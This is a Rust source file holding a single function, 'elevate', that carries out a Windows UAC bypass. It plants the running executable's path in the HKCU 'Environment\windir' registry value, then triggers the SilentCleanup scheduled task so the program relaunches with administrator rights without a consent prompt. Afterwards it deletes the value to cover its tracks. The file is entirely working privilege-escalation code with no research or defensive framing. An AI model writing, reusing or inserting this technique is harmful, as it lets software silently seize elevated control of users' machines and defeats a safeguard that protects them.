pub fn elevate(cb: fn()) {
  // Check the elevation
  if !common::is_elevated() {
    let value_path = &r"Environment\windir";

    // Add the "windir" registry key
    common::registry::set_value(
      common::registry::HKEY_CURRENT_USER,
      value_path,
      &format!("\"{}\"", std::env::current_exe().unwrap().to_string_lossy()),
    )
    .unwrap();

    // Run the SilentCleanup task
    common::scheduled_tasks::run_task(&r"\Microsoft\Windows\DiskCleanup\SilentCleanup").unwrap();

    // Delete the "windir" registry key
    common::registry::delete_value(common::registry::HKEY_CURRENT_USER, value_path).unwrap();
  } else {
    cb();
  }
}
